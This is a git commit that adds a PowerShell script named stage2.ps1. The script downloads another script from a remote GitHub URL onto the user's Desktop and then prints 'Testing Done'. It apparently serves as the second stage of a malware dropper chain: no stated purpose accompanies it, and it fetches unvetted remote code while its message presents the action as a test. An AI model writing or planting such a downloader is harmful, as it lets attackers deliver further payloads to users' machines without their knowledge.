bc7318c9ce934a82abdc7a2104e8ce8446dcd8df
Hoshino_Ai <nino303@protonmail.com>
2025-12-30 07:37:10 -0800

    Add files via upload
    Signed-off-by: Hoshino_Ai <nino303@protonmail.com>

---
+++ stage2.ps1
@@ -0,0 +1,4 @@
+﻿$url= 'https://raw.githubusercontent.com/9lana/Terminal/main/test.ps1'
+$out = "$env:USERPROFILE\Desktop\akeno.ps1"
+(New-Object Net.WebClient).DownloadFile($url, $out)
+Write-Host "Testing Done"
